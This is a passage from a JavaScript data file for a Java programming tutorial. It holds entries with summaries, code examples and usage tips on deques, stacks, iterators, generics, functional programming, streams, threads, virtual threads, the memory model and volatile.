      code: "Deque<Integer> dq = new ArrayDeque<>();\ndq.addFirst(1);   // [1]\ndq.addLast(2);    // [1, 2]\ndq.peekFirst();   // 1\ndq.removeLast();  // 2 removed -> [1]"
    },
    {
      title: "Example 2: Deque as a stack",
      description: "<p>Prefer ArrayDeque over the legacy Stack class.</p>",
      code: "Deque<String> stack = new ArrayDeque<>();\nstack.push(\"a\");   // addFirst\nstack.push(\"b\");\nstack.pop();        // \"b\" (LIFO)\nstack.peek();       // \"a\""
    },
    {
      title: "Example 3: ArrayDeque as a stack (preferred over Stack)",
      description: "<p>Use <code>push</code>/<code>pop</code>/<code>peek</code> on an ArrayDeque instead of the legacy synchronized <code>Stack</code> class.</p>",
      code: "Deque<Integer> stack = new ArrayDeque<>();\n" +
        "stack.push(1); stack.push(2);\n" +
        "stack.pop();   // 2 (LIFO)\n" +
        "\n" +
        "Deque<Integer> queue = new ArrayDeque<>();\n" +
        "queue.offer(1); queue.offer(2);\n" +
        "queue.poll();  // 1 (FIFO) - same class, both roles"
    },
    {
      title: "Example 4 (edge case): ArrayDeque forbids null elements",
      description: "<p>Because it uses null internally as an 'empty' sentinel, storing null is rejected - unlike LinkedList.</p>",
      code: "Deque<String> d = new ArrayDeque<>();\n" +
        "d.add(null); // NullPointerException\n" +
        "\n" +
        "// peek/poll return null to signal 'empty', so a stored null would be ambiguous.\n" +
        "// If you genuinely need null elements, use LinkedList instead."
    }
  ],
  whenToUse: "<p>Use <code>ArrayDeque</code> as your go-to for both stacks and queues &mdash; it's faster than " +
    "<code>LinkedList</code> and the legacy <code>Stack</code>. Deques suit sliding-window algorithms, undo " +
    "history (both ends), and work-stealing. <strong>Gotchas:</strong> <code>ArrayDeque</code> doesn't allow " +
    "<code>null</code> elements. Don't use the old <code>java.util.Stack</code> (synchronized, extends " +
    "<code>Vector</code>, slower) &mdash; use <code>ArrayDeque</code> as a stack. Be consistent about which " +
    "end is 'top' to avoid confusion. For concurrency, use <code>ConcurrentLinkedDeque</code>/" +
    "<code>LinkedBlockingDeque</code>.</p>"
};

C["stack"] = {
  summary: "<p>A <strong>stack</strong> is a <strong>LIFO</strong> (last-in, first-out) structure: you " +
    "<code>push</code> onto the top and <code>pop</code> from the top. Java has a legacy " +
    "<code>java.util.Stack</code> class, but the recommended way is to use <code>ArrayDeque</code> as a stack. " +
    "Stacks model call/undo histories, expression evaluation, backtracking, and DFS.</p>",
  examples: [
    {
      title: "Example 1: Stack via ArrayDeque (preferred)",
      description: "<p>Push/pop/peek the top.</p>",
      code: "Deque<Integer> stack = new ArrayDeque<>();\nstack.push(1);\nstack.push(2);\nstack.peek();   // 2 (top)\nstack.pop();    // 2 (removed)\nstack.pop();    // 1"
    },
    {
      title: "Example 2: Classic use - balanced brackets",
      description: "<p>Push opens, pop on closes.</p>",
      code: "boolean balanced(String s) {\n  Deque<Character> st = new ArrayDeque<>();\n  for (char c : s.toCharArray()) {\n    if (c == '(') st.push(c);\n    else if (c == ')') { if (st.isEmpty()) return false; st.pop(); }\n  }\n  return st.isEmpty();\n}"
    },
    {
      title: "Example 3: balanced-brackets check with a stack",
      description: "<p>The canonical stack use - push openers, pop and match on closers.</p>",
      code: "boolean balanced(String s) {\n" +
        "  Deque<Character> st = new ArrayDeque<>();\n" +
        "  for (char c : s.toCharArray()) {\n" +
        "    if (c == '(') st.push(c);\n" +
        "    else if (c == ')') { if (st.isEmpty()) return false; st.pop(); }\n" +
        "  }\n" +
        "  return st.isEmpty();\n" +
        "}"
    },
    {
      title: "Example 4 (edge case): avoid the legacy java.util.Stack",
      description: "<p>The old <code>Stack</code> extends <code>Vector</code>, so it's synchronized (slow) and even iterates in the wrong (bottom-up) order.</p>",
      code: "Stack<Integer> s = new Stack<>();\n" +
        "s.push(1); s.push(2);\n" +
        "for (int x : s) System.out.print(x); // prints 1 2 - BOTTOM-up, not LIFO!\n" +
        "\n" +
        "// Prefer ArrayDeque: faster, not synchronized, iterates top-first as expected."
    }
  ],
  whenToUse: "<p>Use a stack for LIFO needs: DFS, backtracking, undo, parsing/expression evaluation, and " +
    "managing nested state. <strong>Gotchas:</strong> avoid the legacy <code>Stack</code> class (it's " +
    "synchronized and extends <code>Vector</code>, with odd ordering) &mdash; <strong>use " +
    "<code>ArrayDeque</code></strong> via <code>push</code>/<code>pop</code>/<code>peek</code>. Check " +
    "<code>isEmpty()</code> before popping (<code>pop()</code> throws on empty). Deep recursion uses the call " +
    "stack and can overflow &mdash; an explicit stack can convert recursion to iteration.</p>"
};

C["iterator"] = {
  summary: "<p>An <strong><code>Iterator</code></strong> provides a standard way to traverse a collection's " +
    "elements one at a time (<code>hasNext()</code>, <code>next()</code>, <code>remove()</code>), independent " +
    "of the collection's internal structure. The enhanced for-loop uses iterators under the hood. Iterators " +
    "also allow safe removal during iteration.</p>",
  examples: [
    {
      title: "Example 1: Explicit iteration",
      description: "<p>Manual traversal with hasNext/next.</p>",
      code: "List<String> list = List.of(\"a\", \"b\", \"c\");\nIterator<String> it = list.iterator();\nwhile (it.hasNext()) {\n  System.out.println(it.next());\n}\n// for-each does this for you: for (String s : list) {...}"
    },
    {
      title: "Example 2: Safe removal during iteration",
      description: "<p>Use the iterator's remove(), not the collection's.</p>",
      code: "List<Integer> nums = new ArrayList<>(List.of(1, 2, 3, 4));\nIterator<Integer> it = nums.iterator();\nwhile (it.hasNext()) {\n  if (it.next() % 2 == 0) it.remove();  // safe\n}\n// nums -> [1, 3]   (list.remove() in a for-each would throw)"
    },
    {
      title: "Example 3: safe removal during iteration",
      description: "<p>The iterator's own <code>remove()</code> is the only safe way to delete while traversing.</p>",
      code: "List<Integer> xs = new ArrayList<>(List.of(1, 2, 3, 4));\n" +
        "Iterator<Integer> it = xs.iterator();\n" +
        "while (it.hasNext()) {\n" +
        "  if (it.next() % 2 == 0) it.remove(); // removes via the iterator - safe\n" +
        "}\n" +
        "// xs -> [1, 3].  (Or just: xs.removeIf(n -> n % 2 == 0);)"
    },
    {
      title: "Example 4 (edge case): fail-fast iterators throw on external modification",
      description: "<p>Modifying the collection directly (not via the iterator) during iteration triggers <code>ConcurrentModificationException</code>.</p>",
      code: "for (Integer x : xs) {\n" +
        "  if (x == 2) xs.add(99); // ConcurrentModificationException on next hasNext()\n" +
        "}\n" +
        "// The exception is best-effort, not guaranteed - never rely on NOT getting it.\n" +
        "// For concurrent iteration use CopyOnWriteArrayList or explicit locking."
    }
  ],
  whenToUse: "<p>Use the for-each loop for simple traversal (it uses an iterator). Use an explicit iterator " +
    "when you need to <strong>remove elements during iteration</strong> or control the traversal. " +
    "<strong>Gotchas:</strong> modifying a collection during a for-each (other than via the iterator's " +
    "<code>remove()</code>) throws <code>ConcurrentModificationException</code>. <code>next()</code> without " +
    "checking <code>hasNext()</code> throws <code>NoSuchElementException</code>. For functional-style " +
    "filtering, <code>removeIf(predicate)</code> or streams are cleaner than manual iterators. Implement " +
    "<code>Iterable</code> on your own classes to enable for-each.</p>"
};

C["generic-collections"] = {
  summary: "<p><strong>Generics</strong> let collections (and other types) be parameterized with a type &mdash; " +
    "<code>List&lt;String&gt;</code>, <code>Map&lt;String, Integer&gt;</code> &mdash; giving compile-time type " +
    "safety and eliminating casts. The compiler enforces that only the declared type goes in and comes out, " +
    "catching type errors early instead of at runtime.</p>",
  examples: [
    {
      title: "Example 1: Type-safe collections",
      description: "<p>No casts; errors caught at compile time.</p>",
      code: "List<String> names = new ArrayList<>();\nnames.add(\"Sam\");\n// names.add(42);          // COMPILE ERROR (not a String)\nString first = names.get(0);  // no cast needed\n\nMap<String, List<Integer>> data = new HashMap<>();"
    },
    {
      title: "Example 2: Generic methods and bounds",
      description: "<p>Write reusable, type-safe code.</p>",
      code: "static <T extends Comparable<T>> T max(List<T> list) {\n  T best = list.get(0);\n  for (T x : list) if (x.compareTo(best) > 0) best = x;\n  return best;\n}\nmax(List.of(3, 1, 2));   // 3, fully typed"
    },
    {
      title: "Example 3: bounded wildcards - PECS (Producer Extends, Consumer Super)",
      description: "<p><code>? extends T</code> for reading, <code>? super T</code> for writing - the rule that makes generic APIs flexible.</p>",
      code: "// Producer: read Numbers out -> use 'extends'\n" +
        "double sum(List<? extends Number> xs) {\n" +
        "  double t = 0; for (Number n : xs) t += n.doubleValue(); return t;\n" +
        "}\n" +
        "sum(List.of(1, 2, 3));      // List<Integer> accepted\n" +
        "\n" +
        "// Consumer: write Integers in -> use 'super'\n" +
        "void fill(List<? super Integer> xs) { xs.add(1); }"
    },
    {
      title: "Example 4 (edge case): type erasure and raw types",
      description: "<p>Generics are erased at runtime, so you can't check a generic type with <code>instanceof</code> or create generic arrays; raw types silently disable checking.</p>",
      code: "List<String> xs = new ArrayList<>();\n" +
        "// if (xs instanceof List<String>) {}   // won't compile - erased\n" +
        "System.out.println(xs instanceof List); // only the raw type is checkable\n" +
        "\n" +
        "List raw = xs;          // raw type - compiles with a warning\n" +
        "raw.add(42);            // no check! later: ClassCastException on read\n" +
        "String s = xs.get(0);   // ClassCastException - an Integer was smuggled in"
    }
  ],
  whenToUse: "<p>Always use generics with collections (raw types are legacy and unsafe). Use generic methods/" +
    "classes for reusable, type-safe utilities. <strong>Gotchas:</strong> Java generics use " +
    "<strong>type erasure</strong> &mdash; type info is removed at runtime, so you can't do " +
    "<code>new T[]</code> or <code>instanceof List&lt;String&gt;</code>, and a <code>List&lt;String&gt;</code> " +
    "and <code>List&lt;Integer&gt;</code> are the same class at runtime. Wildcards (<code>? extends</code>, " +
    "<code>? super</code>) handle variance (PECS: Producer Extends, Consumer Super). Avoid raw types (e.g. " +
    "bare <code>List</code>) &mdash; they bypass type safety.</p>"
};

/* ===================== FUNCTIONAL PROGRAMMING ===================== */

C["high-order-functions"] = {
  summary: "<p>A <strong>higher-order function</strong> takes a function as an argument and/or returns a " +
    "function. In Java, functions are represented by functional-interface instances (often lambdas), so " +
    "methods like <code>map</code>, <code>filter</code>, <code>forEach</code>, and " +
    "<code>Comparator.comparing</code> are higher-order. They enable passing behavior as data &mdash; the " +
    "core of functional style.</p>",
  examples: [
    {
      title: "Example 1: Passing behavior in",
      description: "<p>Methods that accept functions.</p>",
      code: "list.forEach(x -> System.out.println(x));   // takes a Consumer\nlist.removeIf(x -> x == null);              // takes a Predicate\nnames.sort(Comparator.comparing(String::length)); // takes a key extractor"
    },
    {
      title: "Example 2: Returning a function",
      description: "<p>A method that produces a function.</p>",
      code: "static Function<Integer, Integer> adder(int n) {\n  return x -> x + n;   // returns a function\n}\nFunction<Integer,Integer> add5 = adder(5);\nadd5.apply(10);   // 15"
    },
    {
      title: "Example 3: returning a function (closure factory)",
      description: "<p>A higher-order function can also <em>return</em> a function, capturing parameters in a closure.</p>",
      code: "Function<Integer, Integer> adder(int by) {\n" +
        "  return x -> x + by;   // captures 'by'\n" +
        "}\n" +
        "var add10 = adder(10);\n" +
        "add10.apply(5); // 15"
    },
    {
      title: "Example 4 (edge case): passing a method that fits the shape",
      description: "<p>Any method matching the functional interface's signature can be passed as a method reference - including comparators built from key extractors.</p>",
      code: "List<String> names = new ArrayList<>(List.of(\"bb\", \"a\", \"ccc\"));\n" +
        "names.sort(Comparator.comparingInt(String::length)); // [a, bb, ccc]\n" +
        "names.sort(Comparator.comparingInt(String::length).reversed());\n" +
        "// A checked-exception-throwing method, though, won't fit a non-throwing\n" +
        "// functional interface - you must wrap it."
    }
  ],
  whenToUse: "<p>Use higher-order functions to abstract over behavior &mdash; custom comparators, callbacks, " +
    "strategy selection, building pipelines. They reduce duplication (parameterize the varying logic). " +
    "<strong>Gotchas:</strong> Java represents functions via functional interfaces (<code>Function</code>, " +
    "<code>Predicate</code>, etc.), so signatures can look verbose. Captured variables must be effectively " +
    "final. Overusing nested/returned functions hurts readability for teams unfamiliar with FP &mdash; balance " +
    "expressiveness with clarity. Method references (<code>Class::method</code>) often read better than " +
    "lambdas.</p>"
};

C["functional-interfaces"] = {
  summary: "<p>A <strong>functional interface</strong> is an interface with exactly <strong>one abstract " +
    "method</strong> (SAM), so it can be implemented by a lambda or method reference. Java's " +
    "<code>java.util.function</code> package provides common ones: <code>Function&lt;T,R&gt;</code>, " +
    "<code>Predicate&lt;T&gt;</code>, <code>Consumer&lt;T&gt;</code>, <code>Supplier&lt;T&gt;</code>, " +
    "<code>BiFunction</code>, etc. <code>@FunctionalInterface</code> enforces the single-method rule.</p>",
  examples: [
    {
      title: "Example 1: Built-in functional interfaces",
      description: "<p>The common ones and their shapes.</p>",
      code: "Function<Integer,Integer> square = x -> x * x;       // T -> R\nPredicate<String> isEmpty = String::isEmpty;          // T -> boolean\nConsumer<String> print = System.out::println;         // T -> void\nSupplier<Double> rnd = Math::random;                  // () -> T\nsquare.apply(5);  isEmpty.test(\"\");  print.accept(\"hi\");  rnd.get();"
    },
    {
      title: "Example 2: A custom functional interface",
      description: "<p>Define your own SAM type.</p>",
      code: "@FunctionalInterface\ninterface Validator<T> { boolean validate(T input); }\nValidator<String> notBlank = s -> !s.isBlank();\nnotBlank.validate(\"x\");   // true"
    },
    {
      title: "Example 3: the core built-in interfaces",
      description: "<p>Most lambdas target one of <code>Function</code>, <code>Predicate</code>, <code>Consumer</code>, <code>Supplier</code>, or <code>BiFunction</code>.</p>",
      code: "Function<String, Integer> len = String::length;       // T -> R\n" +
        "Predicate<String> empty = String::isEmpty;            // T -> boolean\n" +
        "Consumer<String> print = System.out::println;         // T -> void\n" +
        "Supplier<Double> rnd = Math::random;                  // () -> T\n" +
        "BiFunction<Integer,Integer,Integer> add = Integer::sum; // (T,U) -> R"
    },
    {
      title: "Example 4 (edge case): use primitive specializations to avoid boxing",
      description: "<p><code>IntPredicate</code>/<code>ToIntFunction</code> etc. avoid autoboxing overhead in hot paths; and <code>@FunctionalInterface</code> guards your custom ones.</p>",
      code: "IntUnaryOperator sq = x -> x * x;   // no Integer boxing\n" +
        "ToIntFunction<String> len = String::length;\n" +
        "\n" +
        "@FunctionalInterface            // compile error if it gets a 2nd abstract method\n" +
        "interface Validator { boolean test(String s); }"
    }
  ],
  whenToUse: "<p>Use built-in functional interfaces for stream operations, callbacks, and strategy patterns; " +
    "define custom ones when you need a domain-specific named contract. <strong>Gotchas:</strong> annotate " +
    "custom ones with <code>@FunctionalInterface</code> so the compiler enforces a single abstract method. " +
    "Default/static methods don't count toward the SAM limit. Know the standard interfaces (and their " +
    "primitive specializations like <code>IntPredicate</code> to avoid boxing). Don't reinvent " +
    "<code>Function</code>/<code>Predicate</code> &mdash; reuse the standard ones for interoperability with " +
    "streams.</p>"
};

C["functional-composition"] = {
  summary: "<p><strong>Functional composition</strong> combines simple functions into more complex ones. Java's " +
    "functional interfaces provide composition methods: <code>Function.andThen</code>/<code>compose</code>, " +
    "<code>Predicate.and</code>/<code>or</code>/<code>negate</code>, and <code>Comparator.thenComparing</code>. " +
    "Composition lets you build behavior from small, reusable, testable pieces.</p>",
  examples: [
    {
      title: "Example 1: Composing functions and predicates",
      description: "<p>Chain transformations and combine conditions.</p>",
      code: "Function<Integer,Integer> add1 = x -> x + 1;\nFunction<Integer,Integer> times2 = x -> x * 2;\nadd1.andThen(times2).apply(3);   // (3+1)*2 = 8\nadd1.compose(times2).apply(3);   // (3*2)+1 = 7\n\nPredicate<String> nonEmpty = s -> !s.isEmpty();\nPredicate<String> shortStr = s -> s.length() < 5;\nnonEmpty.and(shortStr).test(\"hi\");   // true"
    },
    {
      title: "Example 2: Composing comparators",
      description: "<p>Multi-key sorting.</p>",
      code: "people.sort(\n  Comparator.comparing(Person::lastName)\n    .thenComparing(Person::firstName)\n);"
    },
    {
      title: "Example 3: andThen vs compose ordering",
      description: "<p><code>f.andThen(g)</code> runs f then g; <code>f.compose(g)</code> runs g then f - the order is the usual gotcha.</p>",
      code: "Function<Integer,Integer> plus1 = x -> x + 1;\n" +
        "Function<Integer,Integer> times2 = x -> x * 2;\n" +
        "\n" +
        "plus1.andThen(times2).apply(3); // (3+1)*2 = 8\n" +
        "plus1.compose(times2).apply(3); // (3*2)+1 = 7"
    },
    {
      title: "Example 4 (edge case): composing predicates",
      description: "<p>Predicates compose with <code>and</code>/<code>or</code>/<code>negate</code> to build readable complex conditions.</p>",
      code: "Predicate<String> nonEmpty = s -> !s.isEmpty();\n" +
        "Predicate<String> shortStr = s -> s.length() < 5;\n" +
        "Predicate<String> valid = nonEmpty.and(shortStr);\n" +
        "\n" +
        "valid.test(\"hi\");    // true\n" +
        "valid.test(\"\");      // false\n" +
        "nonEmpty.negate().test(\"\"); // true - 'isEmpty'"
    }
  ],
  whenToUse: "<p>Use composition to build pipelines and complex conditions from small functions, and for " +
    "multi-level sorting. It promotes reuse and testability (test each piece in isolation). " +
    "<strong>Gotchas:</strong> mind the direction: <code>andThen</code> runs left-to-right, " +
    "<code>compose</code> right-to-left &mdash; mixing them up flips your logic. Deeply composed chains can " +
    "get hard to read; name intermediate functions. Composition shines in stream pipelines and comparator " +
    "building; don't over-engineer trivial logic into composed functions.</p>"
};

C["stream-api"] = {
  summary: "<p>The <strong>Stream API</strong> (Java 8+) processes sequences of elements declaratively via " +
    "pipelines of operations: <strong>intermediate</strong> ops (<code>filter</code>, <code>map</code>, " +
    "<code>sorted</code> &mdash; lazy, return a stream) and <strong>terminal</strong> ops " +
    "(<code>collect</code>, <code>forEach</code>, <code>reduce</code>, <code>count</code> &mdash; trigger " +
    "execution). Streams express 'what' to compute, not 'how' to loop, and support parallelism.</p>",
  examples: [
    {
      title: "Example 1: A typical pipeline",
      description: "<p>Filter, map, and collect declaratively.</p>",
      code: "List<String> result = people.stream()\n  .filter(p -> p.age() >= 18)\n  .map(Person::name)\n  .sorted()\n  .toList();   // terminal op runs the pipeline"
    },
    {
      title: "Example 2: Reduce, group, count",
      description: "<p>Aggregations with collectors.</p>",
      code: "int total = orders.stream().mapToInt(Order::total).sum();\nMap<String, List<Person>> byCity =\n  people.stream().collect(Collectors.groupingBy(Person::city));\nlong adults = people.stream().filter(p -> p.age() >= 18).count();"
    },
    {
      title: "Example 3: grouping and summarizing with collectors",
      description: "<p><code>Collectors.groupingBy</code> and downstream collectors turn a flat stream into structured aggregates.</p>",
      code: "record Emp(String dept, int salary) {}\n" +
        "var emps = List.of(new Emp(\"eng\", 100), new Emp(\"eng\", 120), new Emp(\"hr\", 90));\n" +
        "\n" +
        "Map<String, Double> avg = emps.stream()\n" +
        "    .collect(Collectors.groupingBy(Emp::dept,\n" +
        "             Collectors.averagingInt(Emp::salary)));\n" +
        "// {eng=110.0, hr=90.0}"
    },
    {
      title: "Example 4 (edge case): streams are single-use, lazy, and bad for side effects",
      description: "<p>A stream can be traversed once; intermediate ops are lazy (nothing runs without a terminal op); mutating shared state in a stream is an anti-pattern.</p>",
      code: "var s = List.of(1, 2, 3).stream();\n" +
        "s.forEach(x -> {});\n" +
        "s.count(); // IllegalStateException: stream has already been operated upon\n" +
        "\n" +
        "List.of(1,2,3).stream().map(x -> { System.out.println(x); return x; }); // prints NOTHING\n" +
        "// no terminal op -> the lazy pipeline never executes. Don't mutate external\n" +
        "// collections from forEach (esp. in parallel) - collect into a result instead."
    }
  ],
  whenToUse: "<p>Use streams for transforming, filtering, and aggregating collections declaratively &mdash; " +
    "often clearer than loops for data processing. <strong>Gotchas:</strong> streams are <strong>lazy</strong> " +
    "(nothing runs until a terminal op) and <strong>single-use</strong> (can't reuse a consumed stream). Avoid " +
    "side effects inside stream ops (use them functionally). <code>parallelStream()</code> can help for large, " +
    "CPU-bound, independent work but often <em>hurts</em> for small/IO-bound tasks &mdash; measure before " +
    "using. For simple iteration with side effects, a plain loop may be clearer. Don't overuse streams for " +
    "trivial cases.</p>"
};

/* ===================== CONCURRENCY ===================== */

C["threads"] = {
  summary: "<p>A <strong>thread</strong> is an independent path of execution within a program, enabling " +
    "concurrency (doing multiple things at once). You create threads by implementing <code>Runnable</code> " +
    "(preferred) or extending <code>Thread</code>, but in practice you usually use higher-level abstractions: " +
    "<code>ExecutorService</code> (thread pools), <code>CompletableFuture</code>, and concurrency utilities " +
    "rather than raw threads.</p>",
  examples: [
    {
      title: "Example 1: Prefer an executor over raw threads",
      description: "<p>Thread pools manage threads for you.</p>",
      code: "// Raw thread (avoid for real work):\nnew Thread(() -> doWork()).start();\n\n// Preferred: a managed pool\nExecutorService pool = Executors.newFixedThreadPool(4);\npool.submit(() -> doWork());\npool.shutdown();"
    },
    {
      title: "Example 2: Async with CompletableFuture",
      description: "<p>Compose asynchronous tasks.</p>",
      code: "CompletableFuture.supplyAsync(() -> fetchData())\n  .thenApply(data -> transform(data))\n  .thenAccept(result -> save(result));"
    },
    {
      title: "Example 3: prefer ExecutorService over raw threads",
      description: "<p>A thread pool reuses threads and returns <code>Future</code>s - far better than <code>new Thread()</code> per task.</p>",
      code: "try (var pool = Executors.newFixedThreadPool(4)) { // Java 19+ AutoCloseable\n" +
        "  Future<Integer> f = pool.submit(() -> expensive());\n" +
        "  System.out.println(f.get()); // blocks for the result\n" +
        "} // pool shut down automatically"
    },
    {
      title: "Example 4 (edge case): a data race on shared mutable state",
      description: "<p>Unsynchronized <code>count++</code> from multiple threads loses updates because it's not atomic (read-modify-write).</p>",
      code: "int[] count = {0};\n" +
        "Runnable r = () -> { for (int i=0;i<100000;i++) count[0]++; }; // RACE\n" +
        "// running r on many threads yields < expected total\n" +
        "\n" +
        "AtomicInteger safe = new AtomicInteger();\n" +
        "Runnable r2 = () -> { for (int i=0;i<100000;i++) safe.incrementAndGet(); }; // correct"
    }
  ],
  whenToUse: "<p>Use concurrency to keep apps responsive and utilize multiple cores &mdash; parallel " +
    "processing, background work, handling many requests. <strong>Strongly prefer high-level tools</strong> " +
    "(<code>ExecutorService</code>, <code>CompletableFuture</code>, <code>java.util.concurrent</code>) over " +
    "manual <code>Thread</code> management. <strong>Gotchas:</strong> concurrency is hard &mdash; race " +
    "conditions, deadlocks, and visibility bugs are subtle and intermittent. Shared mutable state needs " +
    "synchronization or thread-safe structures. Always shut down executors. Threads are expensive (memory/" +
    "context-switching) &mdash; pool them. Consider virtual threads (Java 21+) for high-concurrency I/O.</p>"
};

C["virtual-threads"] = {
  summary: "<p><strong>Virtual threads</strong> (Project Loom, stable in Java 21) are lightweight threads " +
    "managed by the JVM rather than the OS &mdash; you can have <em>millions</em> of them cheaply. They make " +
    "blocking I/O code scale like async code: write simple, blocking, thread-per-request style, and the JVM " +
    "efficiently parks a virtual thread (freeing the underlying OS thread) while it waits on I/O. They " +
    "dramatically simplify high-concurrency I/O-bound applications.</p>",
  examples: [
    {
      title: "Example 1: Creating virtual threads",
      description: "<p>Cheap threads, simple blocking code.</p>",
      code: "// A virtual thread per task - scales to millions\ntry (var executor = Executors.newVirtualThreadPerTaskExecutor()) {\n  for (int i = 0; i < 100_000; i++) {\n    executor.submit(() -> {\n      var response = httpClient.send(...);  // blocking, but cheap to park\n      return process(response);\n    });\n  }\n}"
    },
    {
      title: "Example 2: Platform vs virtual threads",
      description: "<p>OS-backed vs JVM-managed.</p>",
      code: "// Platform thread: backed by an OS thread (heavy, ~1MB, limited count)\nThread.ofPlatform().start(() -> {});\n// Virtual thread: JVM-managed (light, can have millions)\nThread.ofVirtual().start(() -> {});"
    },
    {
      title: "Example 3: a virtual thread per task",
      description: "<p>Virtual threads are cheap enough to create millions; the executor gives each task its own.</p>",
      code: "try (var exec = Executors.newVirtualThreadPerTaskExecutor()) {\n" +
        "  for (int i = 0; i < 10_000; i++) {\n" +
        "    exec.submit(() -> { Thread.sleep(1000); return fetch(); });\n" +
        "  }\n" +
        "} // 10k concurrent blocking calls, backed by only a few OS threads"
    },
    {
      title: "Example 4 (edge case): pinning negates the benefit",
      description: "<p>A virtual thread that blocks inside a <code>synchronized</code> block 'pins' its carrier OS thread, defeating scalability - use <code>ReentrantLock</code> instead.</p>",
      code: "synchronized (lock) { io.read(); } // PINS the carrier thread during blocking I/O\n" +
        "\n" +
        "// Prefer:\n" +
        "lock.lock();\n" +
        "try { io.read(); } finally { lock.unlock(); } // carrier freed while parked\n" +
        "// Also: don't pool virtual threads - create one per task; they're disposable."
    }
  ],
  whenToUse: "<p>Use virtual threads for <strong>I/O-bound, high-concurrency</strong> workloads &mdash; web " +
    "servers handling many simultaneous requests, calling slow services &mdash; where you want simple blocking " +
    "code that scales. They let you ditch complex reactive/async code for many cases. <strong>Gotchas:</strong> " +
    "they help <em>I/O-bound</em>, not CPU-bound work (CPU work still needs limited threads). Avoid pooling " +
    "virtual threads (create one per task). Beware 'pinning' &mdash; <code>synchronized</code> blocks holding " +
    "a carrier thread during blocking (use <code>ReentrantLock</code> instead). Don't store per-thread state " +
    "in <code>ThreadLocal</code> heavily (millions of threads). Requires Java 21+.</p>"
};

C["java-memory-model"] = {
  summary: "<p>The <strong>Java Memory Model (JMM)</strong> defines how threads interact through memory &mdash; " +
    "specifically the rules of <strong>visibility</strong> (when one thread's writes become visible to " +
    "others) and <strong>ordering</strong> (how operations may be reordered). Without proper synchronization, " +
    "threads may see stale values or reordered operations. The JMM's 'happens-before' relationships " +
    "(established by <code>synchronized</code>, <code>volatile</code>, locks, etc.) guarantee visibility and " +
    "ordering.</p>",
  examples: [
    {
      title: "Example 1: A visibility bug",
      description: "<p>Without synchronization, a write may never be seen.</p>",
      code: "// BUG: another thread may never see 'running = false'\nboolean running = true;          // not volatile/synchronized\n// Thread A: while (running) { ... }\n// Thread B: running = false;     // may not be visible to A -> infinite loop\n// Fix: make 'running' volatile, or use synchronization."
    },
    {
      title: "Example 2: happens-before via synchronization",
      description: "<p>Locks/volatile establish visibility guarantees.</p>",
      code: "// Writes inside a synchronized block are visible to the next thread\n// that enters a block on the SAME lock (happens-before).\nsynchronized (lock) { sharedData = compute(); }\n// volatile writes are visible to subsequent volatile reads."
    },
    {
      title: "Example 3: happens-before via synchronization",
      description: "<p>A write before releasing a lock is visible to a thread that later acquires the same lock - the JMM's core guarantee.</p>",
      code: "private int data; private boolean ready;\n" +
        "synchronized void publish() { data = 42; ready = true; }   // write under lock\n" +
        "synchronized int read() { return ready ? data : -1; }       // read under lock\n" +
        "// The lock establishes happens-before: the reader sees data=42 when ready=true."
    },
    {
      title: "Example 4 (edge case): reordering breaks naive double-checked locking",
      description: "<p>Without <code>volatile</code>, the JMM allows the constructor to be reordered after the reference assignment, exposing a half-built object.</p>",
      code: "private static volatile Singleton instance; // 'volatile' is REQUIRED here\n" +
        "static Singleton get() {\n" +
        "  if (instance == null) {\n" +
        "    synchronized (Singleton.class) {\n" +
        "      if (instance == null) instance = new Singleton();\n" +
        "    }\n" +
        "  }\n" +
        "  return instance;\n" +
        "}\n" +
        "// Drop 'volatile' and another thread can see a non-null but uninitialized instance."
    }
  ],
  whenToUse: "<p>You must understand the JMM whenever multiple threads share mutable data. <strong>Gotchas:</strong> " +
    "the dangerous misconception is that code runs in the order written and writes are immediately visible &mdash; " +
    "neither is guaranteed across threads without synchronization. Use <code>volatile</code> for simple " +
    "visibility flags, <code>synchronized</code>/locks for compound operations, and " +
    "<code>java.util.concurrent</code> (atomics, concurrent collections) which handle the JMM correctly. " +
    "Don't try to reason about low-level reordering yourself &mdash; rely on proven concurrency utilities. " +
    "These bugs are intermittent and hard to reproduce.</p>"
};

C["volatile-keyword"] = {
  summary: "<p>The <strong><code>volatile</code></strong> keyword on a field guarantees <strong>visibility</strong>: " +
    "a write to a volatile field is immediately visible to all threads, and reads always get the latest " +
    "value (no caching in a thread's local view). It also prevents certain instruction reorderings. However, " +
    "<code>volatile</code> does <em>not</em> provide atomicity for compound operations (like " +
    "<code>count++</code>).</p>",
  examples: [
    {
      title: "Example 1: A volatile flag",
      description: "<p>Visibility for a simple stop signal.</p>",
      code: "volatile boolean running = true;\n// Thread A: while (running) { work(); }\n// Thread B: running = false;   // immediately visible to A -> A stops\n// (Without volatile, A might loop forever on a stale cached value.)"
    },
    {
      title: "Example 2: volatile is NOT enough for compound ops",
      description: "<p>count++ is read-modify-write; use atomics.</p>",
      code: "volatile int count = 0;\n// count++;   // NOT atomic: read, increment, write -> race condition!\n// Use AtomicInteger instead:\nAtomicInteger atomic = new AtomicInteger();\natomic.incrementAndGet();   // atomic"
    },
    {
      title: "Example 3: a volatile stop flag",
      description: "<p>The textbook use - one thread signals another to stop; without <code>volatile</code> the loop may never see the change.</p>",
      code: "class Worker implements Runnable {\n" +
        "  private volatile boolean running = true; // visibility guaranteed\n" +
        "  public void run() { while (running) doWork(); }\n" +
        "  public void stop() { running = false; }   // seen promptly by run()\n" +
        "}\n" +
        "// Without 'volatile', the JIT may hoist the flag into a register and loop forever."
    },
    {
      title: "Example 4 (edge case): volatile does NOT make compound actions atomic",
      description: "<p>It guarantees visibility, not atomicity - <code>count++</code> is still a race even when <code>count</code> is volatile.</p>",
      code: "volatile int count;\n" +
        "count++; // read-modify-write: still loses updates under contention\n" +
        "\n" +
        "// For atomic compound ops use AtomicInteger or a lock:\n" +
        "AtomicInteger c = new AtomicInteger();\n" +
        "c.incrementAndGet(); // atomic"
    }
  ],
  whenToUse: "<p>Use <code>volatile</code> for simple flags/state read and written by multiple threads where " +
    "you only need visibility (e.g. a 'shutdown' boolean, a published reference). <strong>Gotchas:</strong> " +
    "it does <strong>not</strong> make compound operations atomic &mdash; <code>count++</code>, " +
    "check-then-act, etc. still race; use <code>Atomic*</code> classes or <code>synchronized</code> for those. " +
    "It's lighter than locking but solves only visibility/ordering, not mutual exclusion. Overusing it as a " +
    "'fix' for concurrency bugs is a common mistake &mdash; understand whether you need visibility " +
    "(volatile), atomicity (atomics), or mutual exclusion (locks).</p>"
};

/* ===================== I/O, NETWORKING & UTILITIES ===================== */

C["i-o-operations"] = {
  summary: "<p>Java <strong>I/O</strong> reads and writes data via <strong>streams</strong>: byte streams " +
